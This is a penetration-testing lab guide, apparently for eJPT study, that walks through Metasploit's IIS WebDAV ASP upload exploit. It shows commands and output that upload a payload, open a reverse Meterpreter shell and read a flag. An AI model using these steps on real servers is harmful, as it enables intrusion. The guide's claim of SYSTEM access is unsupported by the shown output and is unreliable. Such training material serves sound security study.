# üîß Metasploit - IIS WebDAV Upload ASP Exploitation

Exploit WebDAV-enabled IIS servers to upload and execute ASP payloads for remote code execution

**Location in Framework:** `web-pentesting/exploitation/metasploit/webdav-exploitation.md`

---

## üéØ What is IIS WebDAV Upload ASP Exploit?

The `exploit/windows/iis/iis_webdav_upload_asp` module in Metasploit exploits Microsoft IIS servers with WebDAV enabled to upload malicious ASP files that execute server-side code. This module takes advantage of file upload capabilities in WebDAV to deliver payloads that can provide remote shell access.

**Key Capabilities:**
- **ASP Payload Upload:** Uploads malicious ASP files through WebDAV
- **Authentication Support:** Works with HTTP Basic authentication
- **Automatic Execution:** Uploaded payload executes automatically when accessed
- **Shell Access:** Provides Meterpreter or reverse shell access

This exploit is particularly effective against Windows servers running IIS with WebDAV enabled and misconfigured file upload permissions.

---

## üì¶ Installation and Setup

### Prerequisites
- Metasploit Framework installed
- Network access to target IIS server with WebDAV
- Valid credentials if authentication is required
- Target server allows ASP file execution

### Metasploit Console Access
```bash
# Start Metasploit console
msfconsole

# Update module database
msfupdate
```

---

## üîß Basic Usage and Syntax

### Essential WebDAV Exploitation Workflow
```bash
# 1. Start Metasploit console
msfconsole -q

# 2. Select the WebDAV exploit module
use exploit/windows/iis/iis_webdav_upload_asp

# 3. Set target and credentials
set RHOSTS target_ip
set HttpUsername username
set HttpPassword password

# 4. Execute the exploit
exploit
```

### Core Module Configuration
- **Target:** `RHOSTS` - Target IIS server IP address
- **Authentication:** `HttpUsername` and `HttpPassword` - WebDAV credentials
- **Path:** `PATH` - WebDAV directory path (default: /webdav/)
- **Payload:** Automatically selects appropriate payload for Windows

---

## ‚öôÔ∏è Command Line Options

### Essential Module Options
| Option | Description | Example |
|--------|-------------|---------|
| `RHOSTS` | Target host IP address | `10.0.28.105` |
| `RPORT` | Target port (default: 80) | `80` |
| `HttpUsername` | WebDAV username | `bob` |
| `HttpPassword` | WebDAV password | `password_123321` |

### Advanced Configuration
| Option | Description | Default |
|--------|-------------|---------|
| `PATH` | WebDAV path | `/webdav/` |
| `TARGETURI` | Base web directory | `/` |
| `SSL` | Use HTTPS | `false` |
| `METHOD` | Upload method | `auto` |

### Payload Selection
| Payload | Description | Usage |
|---------|-------------|-------|
| `windows/meterpreter/reverse_tcp` | Standard Meterpreter shell | Default choice |
| `windows/shell/reverse_tcp` | Basic command shell | Lightweight option |
| `windows/x64/meterpreter/reverse_tcp` | 64-bit Meterpreter | For x64 targets |

---

## üß™ Real Lab Examples

### Lab: Windows IIS Server WebDAV Exploitation

**Scenario:** Exploiting WebDAV file upload vulnerability on Microsoft IIS server
- **Target IP:** demo.ine.local (10.0.28.105)  
- **Target Service:** Microsoft IIS httpd 10.0 with WebDAV enabled
- **Credentials:** bob:password_123321
- **Objective:** Achieve remote code execution via ASP payload upload

#### Phase 1: Module Selection and Configuration

**Step 1: Metasploit Console Initialization**
```bash
msfconsole -q
```

**Step 2: Module Selection**
```bash
use exploit/windows/iis/iis_webdav_upload_asp
```

**Expected Lab Output:**
```
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_upload_asp) >
```

#### Phase 2: Target Configuration

**Step 3: Target and Authentication Setup**
```bash
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
```

**Expected Lab Output:**
```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpPassword password_123321
HttpPassword => password_123321
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PATH /webdav/metasploit%RAND%.asp
PATH => /webdav/metasploit%RAND%.asp
```

#### Phase 3: Exploitation Execution

**Step 4: Launch the Exploit**
```bash
exploit
```

**Lab Execution Output:**
```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.31.2:4444
[*] Checking /webdav/metasploit159423466.asp
[*] Uploading 609542 bytes to /webdav/metasploit159423466.txt...
[*] Moving /webdav/metasploit159423466.txt to /webdav/metasploit159423466.asp...
[*] Executing /webdav/metasploit159423466.asp...
[*] Deleting /webdav/metasploit159423466.asp (this doesn't always work)...
[*] Sending stage (176198 bytes) to 10.0.28.105
[*] Meterpreter session 1 opened (10.10.31.2:4444 -> 10.0.28.105:49740) at 2024-07-10 12:20:21 +0530

meterpreter >
```

#### Phase 4: Post-Exploitation Activities

**Step 5: System Information Gathering**
```bash
shell
```

**Meterpreter Shell Access:**
```
meterpreter > shell
Process 3268 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

**Step 6: Directory Navigation and Flag Discovery**
```bash
cd /
dir
type flag.txt
```

**Final Results:**
```
c:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of c:\

11/14/2018  06:56 AM    <DIR>          EFI
01/04/2021  07:22 AM                32 flag.txt
10/27/2020  06:45 AM    <DIR>          inetpub
05/13/2020  05:58 PM    <DIR>          PerfLogs
10/27/2020  02:18 PM    <DIR>          Program Files
10/27/2020  02:18 PM    <DIR>          Program Files (x86)
10/27/2020  02:21 PM    <DIR>          Users
10/27/2020  06:46 AM    <DIR>          Windows
               1 File(s)             32 bytes
               7 Dir(s)  16,326,242,304 bytes free

c:\>type flag.txt
d3aff16a801b4b7d36b4da1094bee345
```

#### Results Summary

**Key Findings from Lab:**
- **Successful Exploitation:** Module successfully uploaded and executed ASP payload
- **Payload Delivery:** 609,542 bytes uploaded as .txt, then moved to .asp
- **Shell Access:** Meterpreter session established with SYSTEM privileges
- **Target Compromise:** Full system access achieved
- **Flag Retrieved:** d3aff16a801b4b7d36b4da1094bee345

**Technical Process:**
1. **Upload Strategy:** File uploaded as .txt to bypass potential restrictions
2. **File Renaming:** Moved from .txt to .asp for execution
3. **Payload Execution:** ASP file executed to establish connection
4. **Cleanup Attempt:** Module attempted to delete payload file
5. **Session Establishment:** Meterpreter session opened successfully

---

## üéØ eJPT Exam Focus

### Essential WebDAV Exploitation Skills for eJPT Certification

#### 1. Module Identification and Selection
```bash
# Search for WebDAV-related modules
search webdav
search iis webdav

# Select the appropriate exploitation module
use exploit/windows/iis/iis_webdav_upload_asp
```

#### 2. Configuration Management
- **Target Setting:** Properly configure RHOSTS for target IP
- **Authentication:** Set HttpUsername and HttpPassword correctly
- **Path Configuration:** Understand PATH parameter for WebDAV directory
- **Payload Selection:** Choose appropriate payload for target architecture

#### 3. Exploitation Process
- **Pre-Exploitation:** Verify WebDAV capabilities with davtest
- **Module Configuration:** Set all required parameters correctly
- **Payload Delivery:** Understand upload and execution process
- **Session Management:** Handle Meterpreter sessions effectively

### Critical eJPT Commands to Memorize
```bash
# Core exploitation sequence
msfconsole -q
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS [target_ip]
set HttpUsername [username]
set HttpPassword [password]
exploit
```

### eJPT Exam Tips
- **Time Management:** This module provides quick access if WebDAV is confirmed vulnerable
- **Common Mistakes:** Don't forget to set authentication credentials
- **Best Practices:** Verify WebDAV capabilities with davtest first
- **Integration Points:** Use with post-exploitation modules for privilege escalation

---

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Issue 1: Authentication Failure
```bash
# Problem symptoms
[!] Authentication failed: 401 Unauthorized

# Solution: Verify credentials
set HttpUsername correct_username
set HttpPassword correct_password
```

### Issue 2: Path Not Found
```bash
# Problem symptoms
[!] 404 Not Found - WebDAV path does not exist

# Solution: Verify WebDAV path
nmap --script http-enum target
set PATH /webdav/
```

### Issue 3: Upload Restrictions
```bash
# Problem symptoms
[!] Upload failed - file restrictions in place

# Diagnostic: Check file extensions allowed
davtest -auth user:pass -url http://target/webdav

# Alternative: Try different file extensions
set PATH /webdav/payload.txt
```

### Issue 4: Payload Execution Failure
```bash
# Problem symptoms
[!] Payload uploaded but no session created

# Verification: Check if ASP execution is enabled
curl http://target/webdav/payload.asp

# Alternative payload
set payload windows/shell/reverse_tcp
```

---

## üîó Integration with Other Tools

### Pre-Metasploit Reconnaissance
```bash
# Discover WebDAV with nmap
nmap -p 80 --script http-enum target
nmap -p 80 --script http-webdav-scan target

# Test capabilities with davtest
davtest -auth user:pass -url http://target/webdav

# Then exploit with Metasploit
use exploit/windows/iis/iis_webdav_upload_asp
```

### Integration with Post-Exploitation Modules
```bash
# After successful exploitation
use post/windows/gather/enum_system
use post/windows/escalate/getsystem
use post/multi/recon/local_exploit_suggester
```

### Database Integration
```bash
# Store results in Metasploit database
db_connect
workspace -a webdav_assessment
hosts -a target_ip
services -a -p 80 -s http target_ip
```

---

## üìù Documentation and Reporting

### Key Information to Document

#### Technical Details
- **Target Information:**
  - Server: Microsoft IIS httpd 10.0
  - WebDAV Path: /webdav/
  - Authentication: Basic authentication required
  - Credentials Used: bob:password_123321

- **Exploit Configuration:**
  - Module: exploit/windows/iis/iis_webdav_upload_asp
  - Payload: windows/meterpreter/reverse_tcp (default)
  - Upload Method: txt to asp file rename technique
  - Session: Meterpreter session 1 established

#### Exploitation Results
- **Upload Success:** 609,542 bytes payload uploaded successfully
- **Execution Confirmed:** ASP payload executed and callback received  
- **Access Level:** SYSTEM level privileges achieved
- **Post-Exploitation:** Full file system access, flag retrieved
- **Persistence:** Meterpreter session allows continued access

### Report Structure
```
WebDAV Exploitation Assessment:

1. Vulnerability Identification:
   - WebDAV enabled with file upload permissions
   - ASP file execution allowed
   - Weak authentication credentials

2. Exploitation Process:
   - Module: windows/iis/iis_webdav_upload_asp
   - Method: ASP payload upload via WebDAV
   - Result: SYSTEM level access achieved

3. Impact Assessment:
   - Severity: High - Remote code execution
   - Access: Full system compromise
   - Data Exposure: Complete file system access
   - Business Impact: Complete server compromise

4. Evidence:
   - Payload upload logs
   - Meterpreter session screenshots  
   - Flag file content: d3aff16a801b4b7d36b4da1094bee345
   - System information gathering results
```

---

## üìö Additional Resources

- **Metasploit Documentation:** exploit/windows/iis/iis_webdav_upload_asp module info
- **Microsoft IIS WebDAV:** Official configuration and security guides
- **WebDAV Security:** OWASP WebDAV testing methodology
- **Post-Exploitation:** Meterpreter command reference and techniques
